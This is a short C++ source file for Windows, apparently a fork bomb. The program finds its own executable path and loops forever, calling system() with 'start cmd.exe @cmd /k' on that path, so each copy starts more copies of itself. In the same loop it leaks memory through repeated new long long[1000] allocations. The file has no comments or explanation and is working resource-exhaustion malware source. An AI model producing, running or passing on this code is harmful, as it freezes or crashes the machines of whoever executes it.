#include <windows.h>

int WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPTSTR    lpCmdLine,
	int       cmdShow)
{
	char ownPth[MAX_PATH];

	HMODULE hModule = GetModuleHandle(NULL);
	if (hModule != NULL)
	{
		GetModuleFileName(hModule, ownPth, (sizeof(ownPth)));

		char text[MAX_PATH + sizeof("start cmd.exe @cmd /k \"")];
		for (char a = 0; a < sizeof("start cmd.exe @cmd /k \"") - 1; a++) {
			text[a] = "start cmd.exe @cmd /k \""[a];
		}

		unsigned char ind = 0;
		while (ownPth[ind]) {
			text[ind + sizeof("start cmd.exe @cmd /k \"") - 1] = ownPth[ind];
			ind++;
		}
		text[ind + sizeof("start cmd.exe @cmd /k \"") - 1] = '"';
		text[ind + sizeof("start cmd.exe @cmd /k \"")] = '\0';

		while (1) {
			system(text);

			try {
				new long long[1000];
			}
			catch (...) {
				1000LL + 1000LL;
			}
		}

		return 0;
	}

	return 0;
}